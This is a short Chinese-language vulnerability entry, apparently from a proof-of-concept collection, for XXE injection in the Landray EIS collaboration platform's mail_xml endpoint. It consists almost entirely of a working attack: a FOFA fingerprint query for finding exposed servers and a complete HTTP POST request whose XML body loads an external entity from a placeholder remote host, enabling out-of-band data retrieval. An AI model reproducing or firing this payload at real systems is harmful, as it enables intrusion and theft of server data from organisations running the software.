## 蓝凌EIS智慧协同平台mail_xml存在XXE注入

## fofa
```
body="/Scripts/jquery.landray.dialog.js"
```

## poc
```
POST /mail/mail_server.aspx/mail_xml?type=add HTTP/1.1
Host: 
User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/Xml
Content-Length: 93

<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://IP/test.xml"> %remote;]>
```
